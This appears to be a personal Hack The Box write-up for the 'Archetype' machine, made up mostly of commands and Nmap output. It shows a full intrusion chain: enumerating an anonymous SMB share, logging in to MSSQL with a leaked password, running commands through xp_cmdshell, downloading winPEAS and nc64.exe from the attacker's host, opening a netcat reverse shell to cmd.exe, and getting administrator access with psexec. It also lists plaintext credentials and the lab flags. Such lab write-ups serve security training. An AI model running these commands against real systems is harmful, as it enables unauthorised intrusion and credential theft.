# HTB Archtype

## Working steps

 ```bash
#nmap see end

smbclient -N -L \\\\10.129.95.187\\backups #-N no password -L list shares
smbclient -N \\\\10.129.95.187\\backups #only open share
get prod.dtsConfig

#get password and user
mssqlclient.py ARCHETYPE/sql_svc@$target -windows-auth
M3g4c0rp123

xp_cmdshell "whoami"

#download the files from github manually - failed to use wget on target and attacker machine, something wrong with the file when it got saved I think
https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/ #winPEASx64.exe

ping google.com
#target does not have access to internet
#serve on attacker
cd /server
python3 http.server 88

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.107:88/winPEASx64.exe -outfile .\winPEASx64.exe"

#With WinPeass we found file:
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

administrator MEGACORP_4dm1n!!

smbclient -U 'administrator' -L \\$target

#impacket reverse shell
psexec.py administrator@10.129.95.187

#user-flag
3e7b102e78218e935bf3f4951fec21a3

#root-flag:
b91ccec3305e98240082d4474b848528
```

## Optional reverse shell

```
#Find a folder where you have rights to download files

https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.107:88/nc64.exe -outfile .\nc64.exe"

sudo nc -lvnp 443 #my shell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe 10.10.14.107 4445  -e "cmd.exe /c (cmd.exe  2>&1)"
```

## Fails

```cmd
.\wp.exe | .\nc64.exe 10.10.14.107 4444 #tried to pipe the output to a file on attacker machine
```

### trying to read root

```powershell
#shell could not do two outputs
xp_cmdshell "runas /user:Archtype\administrator "type C:\Users\Administrator\Desktop\root.txt""

wget http://10.10.14.107:88/psexec64.exe -o .\psexec64.exe 

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\p.exe -u Archtype\administrator -p MEGACORP_4dm1n!! cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

## Nmap scan

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 09:14 CDT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 09:15 (0:00:21 remaining)
Nmap scan report for 10.129.118.61
Host is up (0.0086s latency).

Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-18T14:10:38
|_Not valid after:  2054-10-18T14:10:38
|_ssl-date: 2024-10-18T14:15:23+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.118.61:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.118.61:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-18T14:15:15
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-18T07:15:17-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
```